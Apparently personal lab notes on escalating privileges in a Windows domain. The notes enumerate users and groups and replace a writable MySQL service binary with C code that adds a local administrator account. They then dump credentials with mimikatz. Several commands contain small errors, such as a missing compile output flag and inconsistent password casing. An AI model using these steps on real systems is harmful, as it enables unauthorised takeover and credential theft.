![[Pasted image 20230603064850.png]]

Domain: corp.com

Computers 

![[Pasted image 20230603065046.png]]

Users

![[Pasted image 20230603065217.png]]

Groups
![[Pasted image 20230603065240.png]]
 
Loggin as michael(low prev user)

```bash
xfreerdp /u:michael /p:password /d:corp.com /v:192.168.1.50 /w:1920 /h:1080 /fonts /small-sizing

```

get local users

```bash
net user 
```

get domain users 

```bash
net user \domain
```

get michael's group

```bash
whoami /groups
```

This gives information about local groups and domain groups michael is member of

![[Pasted image 20230603070238.png]]

Since michael is not a part of any of prev groups 

<U>Prev Escalation</U>

Find information about services

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.state -like 'Running'}
```

![[Pasted image 20230603070958.png]]
Checking permission for mysqld.exe

![[Pasted image 20230603071101.png]]

I- inheritence
F- Full access

Creating a binnary to replace mysqld.exe

```C
#include <stdlib.h>
int main()
{
	int i;
	i = system ("net user knight P@ssw0rd /add");
	i = system ("net localgroup administrators knight /add");

	return 0;
}
```


compile the file to an exe

```bash
x86_64-w64-mingw32-gcc adduser.c adduser.exe

```

Check for the access for restarting the msql services

```bash
Get-CimInstance -ClassName win32_service -Filter 'name="mysql"' | Select-Object StartMode 

```

Restarting computer

```Powershell
Restart-Computer -WhatIf

```

![[Pasted image 20230603072347.png]]

Loggin as Knight as local account

```bash

xfreerdp /u:knight /p:p@ssw0rd /v:192.168.1.50 /w:1920 /h:1080 /fonts /small-sizing

```

<U>MimiKatz</U>

mimikatz # privilege::debug

It helps to access certain system level process to recover passwords or Hashes

mimikatz # sekurlsa::logonpasswords

